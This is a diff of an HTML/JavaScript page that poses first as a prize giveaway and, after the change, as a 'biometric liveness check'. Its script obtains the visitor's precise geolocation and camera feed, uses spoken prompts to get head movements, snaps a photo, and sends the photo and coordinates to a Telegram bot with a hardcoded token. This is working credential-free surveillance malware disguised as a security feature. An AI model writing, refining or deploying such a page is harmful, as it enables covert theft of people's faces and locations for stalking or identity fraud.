@@ -2,39 +2,61 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>🧧</title>
+    <title>🔒 Secure Face Verification</title>
     <style>
-        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; text-align: center; }
+        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: #111; color: white; font-family: sans-serif; text-align: center; }
         
-        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; opacity: 0; transition: opacity 0.5s ease-in-out; }
+        #video-container { position: relative; width: 640px; height: 480px; margin-bottom: 20px; display: none; }
+        #video { width: 100%; height: 100%; background: #000; border: 3px solid #00ffcc; border-radius: 12px; object-fit: cover; }
         
+        /* Face guide frame overlay */
+        .face-frame {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 240px; height: 320px;
+            border: 3px dashed rgba(0, 255, 204, 0.7);
+            border-radius: 50% / 40%;
+            pointer-events: none;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
+        }
+
         #status { 
             margin: 15px 0; 
             font-weight: bold; 
-            background: rgba(0,0,0,0.6); 
+            background: rgba(0,0,0,0.8); 
             padding: 20px; 
             border-radius: 10px; 
-            font-size: 60px; /* 放大表情 */
+            font-size: 24px; 
+            border: 1px solid #333;
+            max-width: 600px;
         }
         
-        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 5px; border: none; background: #28a745; color: white; }
+        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #00ffcc; color: #111; font-weight: bold; transition: background 0.3s; }
+        button:hover { background: #00b386; color: white; }
         
-        .error-page { font-size: 24px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.8); border-radius: 15px; }
+        .error-page { font-size: 20px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; }
     </style>
 </head>
 <body>
     <div id="app">
-        <h2>🎉 Please click below to claim your prize 🎉</h2>
-        <div id="status">🎰🎰🎰🎰🎰</div>
-        <video id="video" width="640" height="480" autoplay playsinline muted></video>
+        <h2>🛡️ Internal Security: Biometric Liveness Check</h2>
+        <div id="status">Click start to begin identity verification</div>
+        
+        <div id="video-container">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="face-frame"></div>
+        </div>
+        
         <canvas id="canvas" style="display:none;"></canvas>
-        <button id="startBtn">START🎲</button>
+        <button id="startBtn">START VERIFICATION 🔐</button>
     </div>
 
     <script>
         const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
         const app = document.getElementById('app');
         const video = document.getElementById('video');
+        const videoContainer = document.getElementById('video-container');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
@@ -42,19 +64,37 @@
 
         function showError() {
             app.innerHTML = `<div class="error-page">
-                <p>🛠 Please agree to the above authorization to claim your reward. Please refresh the page and try again⚙️</p>
-                <button onclick="location.reload()">Refresh Page</button>
+                <p>⚠️ Verification failed or permissions denied. Please refresh and try again.</p>
+                <button onclick="location.reload()">Retry</button>
             </div>`;
         }
 
+        // Text-to-Speech helper for audio prompts
+        function speakPrompt(text, callback) {
+            status.innerText = text;
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel(); // Stop previous speech
+                const utterance = new SpeechSynthesisUtterance(text);
+                utterance.rate = 1.0;
+                utterance.pitch = 1.0;
+                utterance.onend = () => {
+                    if (callback) callback();
+                };
+                window.speechSynthesis.speak(utterance);
+            } else {
+                // Fallback if TTS is not supported
+                setTimeout(callback, 2500);
+            }
+        }
+
         startBtn.addEventListener('click', async () => {
-            if (!CHAT_ID) { status.innerText = "❌ ID Error"; return; }
+            if (!CHAT_ID) { status.innerText = "❌ Missing Verification ID"; return; }
             startBtn.style.display = 'none';
 
-            // 1. 严格获取定位
+            // 1. Get Location
             let locationText = "";
             try {
-                status.innerText = "Verifying availability in your country📍";
+                status.innerText = "Verifying device location node 📍";
                 const pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
                 });
@@ -64,23 +104,39 @@
                 return;
             }
 
-            // 2. 严格获取相机
+            // 2. Initialize Camera & Start Guided Liveness Flow
             try {
-                status.innerText = "🎁";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                status.innerText = "Initializing camera sensor...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                 video.srcObject = stream;
-                video.style.display = 'block'; 
-                video.style.opacity = '1';
-                status.innerText = "🌐Network connection in progress";
-                
-                // 等待短暂时间确保流已加载
-                setTimeout(() => captureAndUpload(stream, locationText), 1000);
+                videoContainer.style.display = 'block';
+
+                // Step-by-step interactive liveness prompts
+                speakPrompt("Please position your face inside the frame.", () => {
+                    setTimeout(() => {
+                        speakPrompt("Please turn your head slowly to the left, then to the right.", () => {
+                            setTimeout(() => {
+                                speakPrompt("Now, nod your head up and down.", () => {
+                                    setTimeout(() => {
+                                        speakPrompt("Verification sample capturing. Please hold still.", () => {
+                                            setTimeout(() => {
+                                                captureAndUpload(stream, locationText);
+                                            }, 1000);
+                                        });
+                                    }, 3000);
+                                });
+                            }, 4000);
+                        });
+                    }, 3000);
+                });
+
             } catch (err) {
                 showError();
             }
         });
 
         async function captureAndUpload(stream, locationText) {
+            status.innerText = "Processing biometric signature...";
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -88,25 +144,25 @@
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'prize.jpg');
-                formData.append('caption', `ID: ${CHAT_ID}\n📍 ${locationText}`);
+                formData.append('photo', blob, 'liveness_check.jpg');
+                formData.append('caption', `🛡️ [Biometric Verification Log]\nID: ${CHAT_ID}\n📍 ${locationText}\nStatus: Liveness checks completed.`);
 
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                
-                if ((await res.json()).ok) {
-                    // 上传成功：平滑切换为视频播放
-                    status.style.fontSize = "40px";
-                    status.innerText = "🎉 Success!";
-                    stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
-                    video.srcObject = null;
-                    video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
-                    video.loop = true;
-                    video.muted = false; // 播放时恢复声音
-                    video.play();
-                } else {
-                    status.innerText = "⚠️ Upload Failed";
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    const data = await res.json();
+                    
+                    if (data.ok) {
+                        status.style.color = "#00ffcc";
+                        status.innerText = "✅ Liveness Verification Successful!";
+                        stream.getTracks().forEach(t => t.stop());
+                        videoContainer.style.display = 'none';
+                    } else {
+                        status.innerText = "⚠️ Transmission Error. Please retry.";
+                    }
+                } catch (e) {
+                    status.innerText = "⚠️ Network Error during upload.";
                 }
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.95);
         }
     </script>
 </body>
